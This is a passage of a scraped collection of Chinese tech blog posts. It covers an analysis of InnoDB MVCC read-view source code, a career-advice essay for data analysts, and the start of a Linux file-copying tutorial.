擎了|-general_fetch|-row_search_for_mysql|-lock_clust_rec_cons_read_sees这边就是判断并选择版本的地方12345678read_record|-rr_sequential|-ha_rnd_next|-ha_innobase::rnd_next这边就已经到了innodb引擎了|-general_fetch|-row_search_for_mysql|-lock_clust_rec_cons_read_sees这边就是判断并选择版本的地方让我们看下该函数内部:boollock_clust_rec_cons_read_sees(constrec_t*rec/*由innodb扫描出来的一行*/,....){...//从当前扫描的行中获取其最后修改的版本trx_id(事务id)trx_id=row_get_rec_trx_id(rec,index,offsets);//通过参数(一致性快照视图和事务id)决定看到的行快照return(read_view_sees_trx_id(view,trx_id));}12345678boollock_clust_rec_cons_read_sees(constrec_t*rec/*由innodb扫描出来的一行*/,....){...//从当前扫描的行中获取其最后修改的版本trx_id(事务id)trx_id=row_get_rec_trx_id(rec,index,offsets);//通过参数(一致性快照视图和事务id)决定看到的行快照return(read_view_sees_trx_id(view,trx_id));}read_view的创建过程我们先关注一致性视图的创建过程,我们先看下read_view结构:structread_view_t{//由于是逆序排列，所以low/up有所颠倒//能看到当前行版本的高水位标识,&gt;low_limit_id皆不能看见trx_id_tlow_limit_id;//能看到当前行版本的低水位标识,&lt;up_limit_id皆能看见trx_id_tup_limit_id;//当前活跃事务(即未提交的事务)的数量ulintn_trx_ids;//以逆序排列的当前获取活跃事务id的数组//其up_limit_id&lt;tx_id&lt;low_limit_idtrx_id_t*trx_ids;//创建当前视图的事务idtrx_id_tcreator_trx_id;//事务系统中的一致性视图链表UT_LIST_NODE_T(read_view_t)view_list;};12345678910111213141516structread_view_t{//由于是逆序排列，所以low/up有所颠倒//能看到当前行版本的高水位标识,&gt;low_limit_id皆不能看见trx_id_tlow_limit_id;//能看到当前行版本的低水位标识,&lt;up_limit_id皆能看见trx_id_tup_limit_id;//当前活跃事务(即未提交的事务)的数量ulintn_trx_ids;//以逆序排列的当前获取活跃事务id的数组//其up_limit_id&lt;tx_id&lt;low_limit_idtrx_id_t*trx_ids;//创建当前视图的事务idtrx_id_tcreator_trx_id;//事务系统中的一致性视图链表UT_LIST_NODE_T(read_view_t)view_list;};然后通过debug，发现创建read_view结构也是在上述的rr_sequential中操作的，继续跟踪调用栈:rr_sequential|-ha_rnd_next|-rnd_next|-index_first在start_of_scan为true时候走当前分支index_first|-index_read|-row_search_for_mysql|-trx_assign_read_view12345678rr_sequential|-ha_rnd_next|-rnd_next|-index_first在start_of_scan为true时候走当前分支index_first|-index_read|-row_search_for_mysql|-trx_assign_read_view我们看下row_search_for_mysql里的一个分支:row_search_for_mysql://这边只有select不加锁模式的时候才会创建一致性视图elseif(prebuilt-&gt;select_lock_type==LOCK_NONE){//创建一致性视图trx_assign_read_view(trx);prebuilt-&gt;sql_stat_start=FALSE;}1234567row_search_for_mysql://这边只有select不加锁模式的时候才会创建一致性视图elseif(prebuilt-&gt;select_lock_type==LOCK_NONE){//创建一致性视图trx_assign_read_view(trx);prebuilt-&gt;sql_stat_start=FALSE;}上面的注释就是selectforupdate(insharemodel)不会走MVCC的原因。让我们进一步分析trx_assign_read_view函数:trx_assign_read_view|-read_view_open_now|-read_view_open_now_low1234trx_assign_read_view|-read_view_open_now|-read_view_open_now_low好了，终于到了创建read_view的主要阶段,主要过程如下图所示:代码过程为:staticread_view_t*read_view_open_now_low(trx_id_tcr_trx_id,mem_heap_t*heap){read_view_t*view;//当前事务系统中最大的事务id设置为low_limit_noview-&gt;low_limit_no=trx_sys-&gt;max_trx_id;view-&gt;low_limit_id=view-&gt;low_limit_no;//CreateView构造函数，会将非当前事务和已经在内存中提交的事务给剔除，即判断条件为//trx-&gt;id!=m_view-&gt;creator_trx_id&amp;&amp;!trx_state_eq(trx,TRX_STATE_COMMITTED_IN_MEMORY)的//才加入当前视图列表ut_list_map(trx_sys-&gt;rw_trx_list,&amp;trx_t::trx_list,CreateView(view));if(view-&gt;n_trx_ids&gt;0){//将当前事务系统中的最小id设置为up_limit_id,因为是逆序排列view-&gt;up_limit_id=view-&gt;trx_ids[view-&gt;n_trx_ids-1];}else{//如果当前没有非当前事务之外的活跃事务，则设置为low_limit_idview-&gt;up_limit_id=view-&gt;low_limit_id;}//忽略purge事务，purge时，当前事务id是0if(cr_trx_id&gt;0){read_view_add(view);}//返回一致性视图return(view);}12345678910111213141516171819202122232425staticread_view_t*read_view_open_now_low(trx_id_tcr_trx_id,mem_heap_t*heap){read_view_t*view;//当前事务系统中最大的事务id设置为low_limit_noview-&gt;low_limit_no=trx_sys-&gt;max_trx_id;view-&gt;low_limit_id=view-&gt;low_limit_no;//CreateView构造函数，会将非当前事务和已经在内存中提交的事务给剔除，即判断条件为//trx-&gt;id!=m_view-&gt;creator_trx_id&amp;&amp;!trx_state_eq(trx,TRX_STATE_COMMITTED_IN_MEMORY)的//才加入当前视图列表ut_list_map(trx_sys-&gt;rw_trx_list,&amp;trx_t::trx_list,CreateView(view));if(view-&gt;n_trx_ids&gt;0){//将当前事务系统中的最小id设置为up_limit_id,因为是逆序排列view-&gt;up_limit_id=view-&gt;trx_ids[view-&gt;n_trx_ids-1];}else{//如果当前没有非当前事务之外的活跃事务，则设置为low_limit_idview-&gt;up_limit_id=view-&gt;low_limit_id;}//忽略purge事务，purge时，当前事务id是0if(cr_trx_id&gt;0){read_view_add(view);}//返回一致性视图return(view);}行版本可见性:由上面的lock_clust_rec_cons_read_sees可知,行版本可见性由read_view_sees_trx_id函数判断:/*********************************************************************//**Checksifareadviewseesthespecifiedtransaction.&lt;ahref='http://www.jobbole.com/members/wx1409399284'&gt;@return&lt;/a&gt;trueifsees*/UNIV_INLINEboolread_view_sees_trx_id(/*==================*/constread_view_t*view,/*!&lt;in:readview*/trx_id_ttrx_id)/*!&lt;in:trxid*/{if(trx_id&lt;view-&gt;up_limit_id){return(true);}elseif(trx_id&gt;=view-&gt;low_limit_id){return(false);}else{ulintlower=0;ulintupper=view-&gt;n_trx_ids-1;ut_a(view-&gt;n_trx_ids&gt;0);do{ulintmid=(lower+upper)&gt;&gt;1;trx_id_tmid_id=view-&gt;trx_ids[mid];if(mid_id==trx_id){return(FALSE);}elseif(mid_id&lt;trx_id){if(mid&gt;0){upper=mid-1;}else{break;}}else{lower=mid+1;}}while(lower&lt;=upper);}return(true);}123456789101112131415161718192021222324252627282930313233343536373839404142/*********************************************************************//**Checksifareadviewseesthespecifiedtransaction.&lt;ahref='http://www.jobbole.com/members/wx1409399284'&gt;@return&lt;/a&gt;trueifsees*/UNIV_INLINEboolread_view_sees_trx_id(/*==================*/constread_view_t*view,/*!&lt;in:readview*/trx_id_ttrx_id)/*!&lt;in:trxid*/{if(trx_id&lt;view-&gt;up_limit_id){return(true);}elseif(trx_id&gt;=view-&gt;low_limit_id){return(false);}else{ulintlower=0;ulintupper=view-&gt;n_trx_ids-1;ut_a(view-&gt;n_trx_ids&gt;0);do{ulintmid=(lower+upper)&gt;&gt;1;trx_id_tmid_id=view-&gt;trx_ids[mid];if(mid_id==trx_id){return(FALSE);}elseif(mid_id&lt;trx_id){if(mid&gt;0){upper=mid-1;}else{break;}}else{lower=mid+1;}}while(lower&lt;=upper);}return(true);}其实上述函数就是一个二分法，read_view其实保存的是当前活跃事务的所有事务id,如果当前行版本对应修改的事务id不在当前活跃事务里面的话，就返回true,表示当前版本可见，否则就是不可见,如下图所示。接上述lock_clust_rec_cons_read_sees的返回:if(UNIV_LIKELY(srv_force_recovery&lt;5)&amp;&amp;!lock_clust_rec_cons_read_sees(rec,index,offsets,trx-&gt;read_view)){//当前处理的是当前版本不可见的情况//通过undolog来返回到一致的可见版本err=row_sel_build_prev_vers_for_mysql(trx-&gt;read_view,clust_index,prebuilt,rec,&amp;offsets,&amp;heap,&amp;old_vers,&amp;mtr);}else{//可见，然后返回}123456789101112if(UNIV_LIKELY(srv_force_recovery&lt;5)&amp;&amp;!lock_clust_rec_cons_read_sees(rec,index,offsets,trx-&gt;read_view)){//当前处理的是当前版本不可见的情况//通过undolog来返回到一致的可见版本err=row_sel_build_prev_vers_for_mysql(trx-&gt;read_view,clust_index,prebuilt,rec,&amp;offsets,&amp;heap,&amp;old_vers,&amp;mtr);}else{//可见，然后返回}undolog搜索可见版本的过程我们现在考察一下row_sel_build_prev_vers_for_mysql函数:row_sel_build_prev_vers_for_mysql|-row_vers_build_for_consistent_read123row_sel_build_prev_vers_for_mysql|-row_vers_build_for_consistent_read主要是调用了row_ver_build_for_consistent_read方法返回可见版本:dberr_trow_vers_build_for_consistent_read(...){......for(;;){err=trx_undo_prev_version_build(rec,mtr,version,index,*offsets,heap,&amp;prev_version);......trx_id=row_get_rec_trx_id(prev_version,index,*offsets);//如果当前row版本符合一致性视图，则返回if(read_view_sees_trx_id(view,trx_id)){......break;}//如果当前row版本不符合，则继续回溯上一个版本(回到for循环的地方)version=prev_version;}......}123456789101112131415161718dberr_trow_vers_build_for_consistent_read(...){......for(;;){err=trx_undo_prev_version_build(rec,mtr,version,index,*offsets,heap,&amp;prev_version);......trx_id=row_get_rec_trx_id(prev_version,index,*offsets);//如果当前row版本符合一致性视图，则返回if(read_view_sees_trx_id(view,trx_id)){......break;}//如果当前row版本不符合，则继续回溯上一个版本(回到for循环的地方)version=prev_version;}......}整个过程如下图所示:至于undolog怎么恢复出对应版本的row记录就又是一个复杂的过程了，由于篇幅原因，在此略过不表。read_view创建时机再讨论在创建一致性视图的row_search_for_mysql的代码中//只有非锁模式的select才创建一致性视图elseif(prebuilt-&gt;select_lock_type==LOCK_NONE){//创建一致性视图trx_assign_read_view(trx);prebuilt-&gt;sql_stat_start=FALSE;}123456//只有非锁模式的select才创建一致性视图elseif(prebuilt-&gt;select_lock_type==LOCK_NONE){//创建一致性视图trx_assign_read_view(trx);prebuilt-&gt;sql_stat_start=FALSE;}trx_assign_read_view中由这么一段代码//一致性视图在一个事务只创建一次if(!trx-&gt;read_view){trx-&gt;read_view=read_view_open_now(trx-&gt;id,trx-&gt;global_read_view_heap);trx-&gt;global_read_view=trx-&gt;read_view;}12345678//一致性视图在一个事务只创建一次if(!trx-&gt;read_view){trx-&gt;read_view=read_view_open_now(trx-&gt;id,trx-&gt;global_read_view_heap);trx-&gt;global_read_view=trx-&gt;read_view;}所以综合这两段代码，即在一个事务中，只有第一次运行select(不加锁)的时候才会创建一致性视图,如下图所示:笔者构造了此种场景模拟过，确实如此。MVCC和锁的同时作用导致的一些现象MySQL是通过MVCC和二阶段锁(2PL)来兼顾性能和一致性的，但是由于MySQL仅仅在select时候才创建一致性视图，而在update等加锁操作的时候并不做如此操作，所以就会产生一些诡异的现象。如下图所示:如果理解了update不走一致性视图(read_view)，而select走一致性视图(read_view)，就可以很好解释这个现象。如下图所示:总结MySQL为了兼顾性能和ACID使用了大量复杂的机制，2PL(两阶段锁)和MVCC就是其实现的典型。幸好可以通过xcode等IDE进行方便的debug，这样就可以非常精确加便捷的追踪其各种机制的实现。希望这篇文章能够帮助到喜欢研究MySQL源码的读者们。1赞1收藏评论", "url_object_id": "9c2c07d9d67d6bd6fb879c9bf7e3aaa7"},{"title": "听说你立志要做数据分析，不如先听听老司机的建议？", "url": "http://blog.jobbole.com/114150/", "create_date": "2018-09-13", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/06/03b5b99cd8b93d7c062277c5de23570b.jpg"], "praise_nums": 4, "fav_nums": 6, "comments_nums": 1, "tags": "2,0,1,8,/,0,6,/,2,5, ,·", "content": "原文出处：作者JerryHuang推荐每年总有很多人，怀揣着对世界的一知半解、满腔似火的热情、还有对美好生活的向往，走出象牙塔，投身社会。世界很大，诱惑很多。对于未来，甚至在工作多年后，他们仍然没有清晰的方向，或者缺乏独立、深度的思考。方向很重要，而人生很短暂。往哪里走，怎么走，再怎么也得花点时间思考一下，不是吗？如果你决心要在数据科学领域有所作为，或者立志做数据分析，这篇文章提了点小建议，希望对你有所帮助。一、去大厂还是去小厂？我们做每件事之前，都要先明确做这件事的目的和意义是什么。先来问问自己，做数据分析的目的和价值是什么？我的理解是，致力于用数据帮助企业解决业务问题，辅助业务决策。关于这个问题，你可以花3-5年时间来思考和领悟，不急，但需要想清楚。你还面临一个抉择，到底是去大厂还是去小厂？之前接到很多猎头电话，不少都会问：“你是做分析还是做挖掘的呀？”刚开始，也常会和猎头在电话里“理论”一番。后来在大厂待过才明白，大厂分工比较细，分析是偏向经营分析，即取数分析写报告，而挖掘则是建模调参部署等。小厂就不一样了，谈需求、确定思路、指标设计、平台搭建、接入数据、处理数据、建立宽表、模型训练、结果分析、撰写报告、模型部署、报表计算、数据可视化等一整个流程，一个人几乎都可能会参与。如果有机会，请一定要去大厂历练几年！大厂大多都很开放，常常敢为天下先，敢于引入一些新的东西，包括技术、思维、制度，技术比较先进，优秀的人也很多。大厂的管理制度也很完善，福利待遇当然会更好些。大厂的数据规模绝对够大，而且应用场景也多，可施展的空间应该会比较大。所以，抱着学习的态度在大厂里混几年，是可以成长很快的。（有好，当然也有不好）大厂流程繁杂，整体效率偏低，提一个取数申请可能需要1-2周。大厂的内部竞争也大，存在于不同项目团队，也存在于同一部门不同成员之间。大项目资源投入大，小项目资源申请很困难，重视程度也不一样。最主要的，大厂分工很明细，不同职位的轮换似乎不大容易，从入职到几年后离开一直做经营分析都是有可能的，容易导致能力的单一，不利于个人综合素质的培养。相比之下，小厂就灵活多了，人和事都不会很复杂，而且效率也高。小厂可能会优先考虑做这件事情的投入和产出，即看应用效果。（大厂反而愿意给资源去试，短期内不怎么关注投入产出。）所以，在小厂工作，既要学会帮公司赚钱，也要学会帮公司省钱。小厂分工不会很细，大多需要一个人做多种工作。所以，小厂里面的程序员常常身怀多技。但小厂数据规模小，技术实力较弱，团队成员整体素质不高，而且项目流程不大规范，常常怎么简单怎么来，怎么高效怎么来。有些小公司的码农，除了对外发过一两封邮件，平时的沟通几乎是在QQ里，结果待了几年之后连写一封邮件都不会。有些小厂自己没有数据，重要是作为乙方给大企业做项目，这种模式常常受甲方牵制，可发挥的空间很小，而且一个项目周期往往比想象中要长（我本人之前就厌倦做乙方），因此不大建议去这样的公司。不管大厂还是小厂，在选择时，建议都要看看所要加入的团队。综合来说，建议先去大厂混几年，再去小厂找个Title高点的职位发挥自己所长。再来说几句，什么场景下分析，什么场景下挖掘呢？分析其实是一个很笼统的概念。把当前营业额跟去年同期做对比发现增长了不少，这个也可以认为是分析。分析是从数据中发现问题或规律，并提出合理的建议。分析常常伴随着要写报告，进而要给业务方汇报分析结果。最好是给决策层汇报，因为决策层有拍板的权力，而且对数据结果的感知和可能的应用有自己独到的认知。如果需要把分析的结果固化下来，定期输出结果，提供给业务方，这个时候就需要开发数据产品了。挖掘是用算法解决某个具体的复杂问题，用常规分析方法解决不了的，如客户流失预警、商品最优推荐组合、最有投递路线规划等。所以，我一般认为，分析是从数据中发现问题或规律，而挖掘是其中的一块。数据技能知识一览二、1-3年，“所见即所得”，打磨基础技术在职业生涯的初期，请牢记，“所见即所得，所感即所知，多见即多得，多感即多知”。不管在大厂还是在小厂，一定要参与到实际项目当中，好好打磨自己的技术。不管是大项目还是小项目，一定要借助来之不易的机会，以极致的工匠精神修炼自身。你最好能从基础数据处理做起。只有这样，你才能早点知道，数据并不像在学校里做实验用到的数据那样“好”，它可能看起来“又脏又乱”。只有这样，你才能早点知道，给你取数的那个程序员是如何花了2-3天甚至一周时间才把数算好。如果你精通SQL，那就太好了，这样就可以直接能够在数据平台查看原始的数据了。最好要看一看最原始的数据长什么样。你不一定能一下子理解这些数据，但你可以慢慢地感受它们，因为它们所投射出来的是最真实的业务场景。举个例子吧，原始的会员注册信息数据里面，性别一般填“男”、“男性”、“女”、“女性”、“未知”、“其它”等值，但处理好之后的二手数据里面，性别就变成了“男”、“女”、“未知”等三个值了。仅看这三个值，可能会漏掉一些业务场景，填“男”可能是从移动端输入时选择的，填“男性”则可能是手工填写注册表格时勾选上的。而漏掉的这个场景，说不定就是所要找的那个分析点。你最好还能熟练掌握一两门编程语言，比如当下流行的Python，作为入行的基础技能。（顺便说一下，码农界普遍认为只会SQL的不算真正的程序员~~）当今时代，编程已经从娃娃开始抓起。早在5年前，英国规定5岁以上儿童必须学习编程课，法国将编程列入初等教育选修课程，美国已有40个州制定政策支持计算机科学，有35个州将计算机科学课程纳入高中毕业学分体系。美国前总统奥巴马就曾在全美发起“编程一小时”的运动，旨在让全美小学生开始学习编程。2017年，浙江、北京、山东等省确定要把Python编程基础纳入信息技术课程和高考的内容体系。编程将是一项很基础的技能，也将是承接其他知识的基石。在未来，会编程很可能跟使用智能手机一样普遍。当处理基础数据的时候，必然会在数据库或数据平台上进行。你可能需要对这些存储数据的环境加以了解，如传统的结构化数据库Oracle、Mysql、DB2等，又如当下流行的Nosql数据库HBase、Redis、MongoDB、Cassandra等，再如大数据集群平台、原理及其相关概念，类似Hadoop、Hive、Hue、MapReduce、Spark、Scala、Sqoop、Pig、Zookeeper、Flume、Oozie等。你或者也需要了解数据传输的工具，如DataStage、Kafka、Sqoop等。你甚至也可能被安排做安装系统、部署软件、配置环境、同步数据等一些琐碎的工作。关于这些，如果你非常感兴趣，可以考虑往大数据平台方向发展，成为数据开发工程师、数据平台运维工程师、或者数据平台架构师。你不必理解太深，可仅仅停留在了解层面，但知道这些知识会让你和数据开发工程师、运维工程师和平台架构师沟通起来顺畅很多。当处理和分析数据时，有些关于数据的操作是必然需要掌握的。首先是常见格式的数据导入导出，如TXT、CSV、XLS，然后是主要的数据加工技巧，包括建表/视图、插入、更新、查询、并联、串联、汇总、排序、格式转换、循环、常用的函数、描述统计量、变量，等等。这些操作很基础，但不简单。你可能经常会遇到各种情况，如花了一个下午时间就是没能把一个很小的CSV数据文件正确地导入到数据库中，不是乱码就是错位，或者两表关联时老是报一些烦人的错误，或者日期字段进行格式转换时出现空值……反正状况百出，防不胜防。关于这些基础操作，需要不断积累经验，尽量能够做到在不同场景下快速高效地完成，轻松应付。如果有人已经给你取好了数，而你的工作是分析数据写报告，那么分析技巧首先是你需要培养起来的。对拿到的数据，要时刻保持疑问，不能太乐观，因为别人算好的数据未必完全是你想要的数据，又或者数据质量并不是你想的那样好。在分析之前，需要进行数据探索，看看数据质量如何。比如，你需要清楚有多少数据量，有什么信息，可衍生什么指标，缺失情况如何，如何填补缺失值，值的分布情况如何，如何处理极值，名义/字符变量是否需要转换，等等。分析时，要清楚指标不同形态的含义，如绝对值、占比、同比、趋势、均值、标准差，等等。在这里，我想指出，数据有对比才有意义。如果一个穷人捡到100元，他会很高兴，这够他吃好几天了。但如果让一个富人去捡100元，那感觉就不一样了，他可能觉得他不值得这么做，因为用弯腰去捡的时间挣到的钱远远不止这么多。统计学知识是必须要掌握的，这是基础。如果你非数学或统计学专业出身，那么请自学。另外，也请你一定要掌握主流算法的原理，比如线性回归、逻辑回归、决策树、神经网络、关联分析、聚类、协同过滤、随机森林，再深入一点，还可以掌握文本分析、深度学习、图像识别等相关的算法。关于这些算法，不仅需要了解其原理，你最好可以流畅地阐述出来，还需要你知晓其在各行业的一些应用场景。关于这些算法，你最好能够参与关于模型开发的具体项目实践。那样的话，你就可以清楚关于建模的大概流程是怎么样的，不同算法在建模中有不同，需要注意哪些地方。如果你打字速度不快，那也最好重视起来，这虽然是一个不痛不痒的问题，但也在较大程度上影响你的工作效率，进而影响到你的工作产出，当然也可能因此会影响到你的薪资哦！另外，还有一些提高工作效率的小技巧，也可以多学多掌握。例如，一些电脑的快捷键，定期保存文件，文件的归类存放和快速查找，等等。作为职场新人，你不仅需要打磨技术，纯技术之外的技能也需要不断修炼。职场的做事方式方法、为人处事以及一些潜规则，更多时候只能靠悟，说出来就可能不大好了，因此需要不断领悟。毕竟，悟性这东西是很重要的。还有，沟通是码农普遍的老大难问题，建议重视起来并加强。你甚至可以学一下投影仪或打印机怎么用。（说不定可以靠这个技能在老板或同事前面大攒人品哦~~）如果你有机会和很牛的人在一起工作，那你太幸运了。你可以多请教优秀的人一些问题，也可以平时多观察那些优秀之人的做事方式、工作习惯，看看有哪些好的地方、好的品质值得你学习。只要吸纳进来，就可以转化为你的优点，推动你进步。我毕业的第三年，看到俞敏洪老师在一些演讲中提及他大学时读了800多本书，很受触动，真正认识到了读书的重要性，于是给自己制定了一年读50本书的计划，什么书都读，三年左右时间，我的心智和心态都发生了很大的改变，完全不一样了。俗话说：“三人行，必有我师。”每个人都有每个人的优点，对于所遇到的每个人，建议多欣赏别人的优点，少抨击别人的缺点，这样你就可以“兼收并蓄”，逐步塑造更好的自己。三、3-5年，“技多不压身”，拓展能力边界当迈过了最初的3个年头后，你的技术越来越好，也做了不少项目，也越来越清楚自己未来的方向，但你也会发现有越来越多的东西还需要去学习和加强。这个时候，你的知识是零散的，还远未形成体系。你也许还需要花些时间好好梳理和总结过去几年积累的经验和知识，不断沉淀，形成自己的知识体系和方法论。在梳理的过程中，你会不断清楚自己有什么，缺什么，哪些地方弱，哪些地方强，未来需要花多少时间补强哪项技能，等等。你可以沿着数据的整个流程，即数据采集、数据存储、数据处理、数据分析/开发模型、报表计算、数据可视化，不断拓展自己的能力边界，最好在流程中的各个环节都做过项目。例如，在数据采集环节，你可以学一下爬虫技术。这个时候，你不再是新人。新人大多是等着别人安排工作，并在详细的指导之下完成。而你慢慢成长为老司机了，需要独立完成一个个任务了，如独立开发一个模型、写一份会员分析报告、梳理关于近期营业额下降原因分析的思路，等等。你需要不断适应在无人指点的情况自己去寻求问题解决办法，也可能需要应对此前没有遇到过的新情况并独立展开调查研究。几乎没有人帮你，你也没法指望别人明确告诉你怎么做。而你需要的是，历经3年之后成长路上的一个质变。在这过程中，你可能需要不断查找资料，咨询别人，并加以思考，梳理出有效的方案，最后落地执行。在这过程中，可以有效训练以下几方面的能力：查找资料会问问题总结梳理写作能力关于总结梳理，建议定期做，常常做，每天做，建议养成一个日常习惯。对于不同问题和场景的思路整理总结，常常需要方法论指导，如麦肯锡金字塔原理、结构化思维等。关于这些方法论，不仅要谙熟于心，也需要将其应用到实际工作当中。这是受用一生的知识，你也可将其运用到你的日常生活中，用以解决你日常的问题和需求。关于思路的整理，可以借助思维导图工具。另外，请注重培养自己的数据敏感性和数据思维，越早开始越好。关于如何培养数据思维，将以另外的文章单独阐述。EXCEL是操作和处理数据最方便的工具，也是必须掌握的办公软件。很多人会用EXCEL，但根本不精通EXCEL。简历里那句“精通EXCEL等办公软件”（你的简历里是否也这样写~~），常常是一个谎言。建议你好好学一下EXCEL，包括展示数据、透视表、函数、画图、动态图表、VBA等。不要仅仅停留在最粗的层面，比如画图，使用默认设置也可以画出一个图表，但是不好看，阅读体验不好。关于怎么用EXCEL画好图表，推荐阅读《EXCEL图表演示之道》、《最简单的图形与最复杂的信息》。写分析报告，难免会用到PPT。关于如何写好PPT这件事，从来就不是件轻松的事。但你可以给自己一些时间去学，比如3年、5年、甚至10年。刚开始，写得不好没关系，但一定不要放过每一次锻炼的机会。关于PPT的技巧，将有更多的文章单独阐述。在领导眼里，会写材料的人比会编程的人更有存在感。而且，会写材料的人总是显得那样“稀缺”。如果你是别的同事眼里的“会Coding的人中最会写PPT+会写材料的人中最懂技术”的那个人，那你将会很受重用。四、5-10年，“不忘初心”，有所为有所不为在别人眼里，数据分析和开发模型是很高大上的。但这高大上，常常处在很多尴尬的处境。数据分析汇报一次之后就没了下文，模型开发了，部署了，也定期出数了，但就是没用起来。用户方或业务方觉得这些东西对他们业务帮助不大，可有可无（虽然包装一下用来忽悠一下投资人可能也有点用处），还不如一个经验规则来得有效，简单粗暴，省时省力。关于经验规则和算法模型之争，如果你坚定认为你开发的模型比业务方所认为的经验规则更有效，那么，请你拿出“证据”，用数据说服业务方，让他们改变观念，觉得你是对的。之前信奉的那句“数据驱动业务”，是不是错了吗？此刻，请回到初心吧！我们的初心是什么？那就是用数据帮助业务解决问题，用数据辅助业务决策。数据分析只是其中一种形式，当然还有其它。因此，不要迷恋数据分析，不要迷恋算法模型。“不管黑猫白猫，抓到老鼠就是好猫。”如果你能够从数据分析和算法模型的困囿中挣脱出来，那么你将发现你面对的是广阔天地，你可以在数据的海洋里肆意遨游。你或许开始注重追求数据解决方案的实用性，强调落地执行，更看重应用效果。你必须真正理解业务方的需求。当业务方进行选品和定价时，他们需要一份关于竞品的商品数据来做参考；当业务方想随时看到当前时刻的订单量（特别是618或双11），你需要实时汇总数据并实时呈现给他们；当业务方既想看总体的经营数据，也想看各区各部门各门店的经营数据，你需要开发一个多维度层层钻取查看的功能……而这些都不是数据分析和算法模型，但这些也是数据应用，也能产生数据价值。如果有机会，不妨尝试做个数据产品经理。数据产品经理需要从产品角度实现业务功能。在当前数据产品化的趋势下，这是一个很有挑战性的事情，不容易做好。毕竟，讨好一大群用户，比单独讨好一个用户要难得多。在数据产品设计里，数据可视化是一个重要的事情。好的图表会说话，好的功能会抓住用户的心。即便撇开数据产品，我们在分析报告里也会需要数据的可视化表达。数据可视化传递的是一种明确的数据信息，一目了然，赏心悦目。从画好一个数据图表，到功能版式的精心设计，再到对功能细节良苦用心的把握，你需要不断精进。一旦你感兴趣，你将会很快沉迷于其中，因为那是一种美的表达。五、10年+，“砥砺前行”，创新、创业、创造是的，你已经做了十年，希望你无悔当初的选择与坚持。此时你也遇到很多瓶颈，或许你空有一身好武艺但得不到老板重用，或许你想做个实力派但处于各种原因离技术越来越远，或许你很努力但职务仍然上不去，或许你面对繁重的工作心有余而力不足，各种分身乏术……你一直在等待和寻找着机会，突破自己。此时你也渐渐步入了中年，或许你开始变得油腻，或许你的身材早已远离苗条，或许岁月在你的脸上、头发上开始留下痕迹，或许你的思想渐渐固化，不能与时俱进了……最重要的，或许就是你早已没有了当初的激情。如果你在一个行业待了十年，在别人眼里，无论怎样，都已是个专家，所以，请自信！你还需要在圈里有一定的影响力，需要树立个人品牌，最好能在圈里外有较好的传播。如此这样，当别人提起你的时候，他们常会这样说，“这个人分析能力很强”，“他在数据领域造诣很深”，“他建模能力出众”……如此种种，在他们眼里对你印象最深刻的标签将会是你最想要的那个。或许你需要逐步提升讲课程的能力，这是一种知识分享与传递，也是提高个人影响力的有效途径。不要放过任何露脸的机会哦！你或许已经深刻明白，分析的结果、开发的模型、数据产品只有被应用起来，才真正算是产生价值。你会越来越关注数据应用的问题。当你开始聚焦这个问题时，你会问自己，”用户或业务方真正需要什么？“这个时候，你得有用户思维了。你会加强对业务的重视程度，也会不断回到业务层面去思考数据的实际应用。你最好也时刻关注当前社会的趋势和潮流，特别是与互联网相关的。这样可以让你保持开放的心态，洞悉社会的风向，驱动自己的思考，挖掘潜在的机会。你可以从中了解当前行业中成功的数据应用案例，开拓自己的思路，多想想用数据还可以帮助各行业解决什么问题，可能的机会在哪里，自己应该怎么做。你可能要面对的是，数据应用对一个行业或一个企业来说，永远都是在探索。某个数据应用思路或项目一旦成功了，就会得到越来越多的资源投入，越做越大，如果失败了，就会立刻遭放弃。因此，要有创新精神，要有创新的勇气和自信。职位上来说，你可能开始担任一定的管理工作。因此，你还得学会团队管理，懂得如何向上管理和向下管理。你的日常事务会越来越多，你也需要学会有效管理自己的时间。你可以成为一名“清单控”。但必须指出的是，时间管理，最本质的还是自我的管理，对精力的管理。你需要开始意识到加强身体锻炼的重要性了。一来，保持身材，对发福说不，二来，保持精力的旺盛，抵抗疲倦，第三，通过不断挑战自己的身体极限来刺激自己，找回激情。你也需要开始认真考虑如何平衡工作和家庭的问题了。这个世界一直在变。我们也一定要“善变”，顺势而为。不管是10-20年前的BI（商务智能），过去几年的大数据，这年头炒得火爆的人工智能，还是未来涌现的更多概念，只要我们足够开放，敏感洞察，挖掘机会，创新、创业、创造，不断成就自己。汪国真在《热爱生命》里写道：“我不去想是否能够成功，既然选择了远方，便只顾风雨兼程。”英雄不问出身，只要你下定决心，即使再晚出发，也会达到，还可以走得更远。最后，作为数据人，与你共勉，“不做数据的搬运工，要做价值的缔造者”。4赞6收藏1评论", "url_object_id": "52d5249e6e503caa3d53418ba9db1163"},{"title": "在 Linux 上复制和重命名文件", "url": "http://blog.jobbole.com/114148/", "create_date": "2018-09-13", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2017/05/77d80105fd15f2465894827e23cc4842.jpeg"], "praise_nums": 1, "fav_nums": 1, "comments_nums": 0, "tags": "2,0,1,8,/,0,6,/,2,3, ,·", "content": "原文出处：SandraHenry-stocker译文出处：Linux中国/geekpicp和mv之外，在Linux上有更多的复制和重命名文件的命令。试试这些命令或许会惊艳到你，并能节省一些时间。Linux用户数十年来一直在使用简单的cp和mv命令来复制和重命名文件。这些命令是我们大多数人首先学到的，每天可能有数百万人在使用它们。但是还有其他技术、方便的方法和另外的命令，这些提供了一些独特的选项。首先，我们来思考为什么你想要复制一个文件。你可能需要在另一个位置使用同一个文件，或者因为你要编辑该文件而需要一个副本，并且希望确保备有便利的备份以防万一需要恢复原始文件。这样做的显而易见的方式是使用像cpmyfilemyfile-orig这样的命令。但是，如果你想复制大量的文件，那么这个策略可能就会变得很老。更好的选择是：在开始编辑之前，使用tar创建所有要备份的文件的存档。使用for循环来使备份副本更容易。使用tar的方式很简单。对于当前目录中的所有文件，你可以使用如下命令：$tarcfmyfiles.tar*12$tarcfmyfiles.tar*对于一组可以用模式标识的文件，可以使用如下命令：$tarcfmyfiles.tar*.txt12$tarcfmyfiles.tar*.txt在每种情况下，最终都会生成一个myfiles.tar文件，其中包含目录中的所有文件或扩展名为.txt的所有文件。一个简单的循环将允许你使用修改后的名称来制作备份副本：$forfilein*&gt;do&gt;cp$file$file-orig&gt;done12345$forfilein*&gt;do&gt;cp$file$file-orig&gt;done当你备份单个文件并且该文件恰好有一个长名称时，可以依靠使用tab来补全文件名（在输入足够的字母以便唯一标识该文件后点击Tab键）并使用像这样的语法将-orig附加到副本的名字后。$cpfile-with-a-very-long-name{,-orig}12$cpfile-with-a-very-long-name{,-orig}然后你有一个file-with-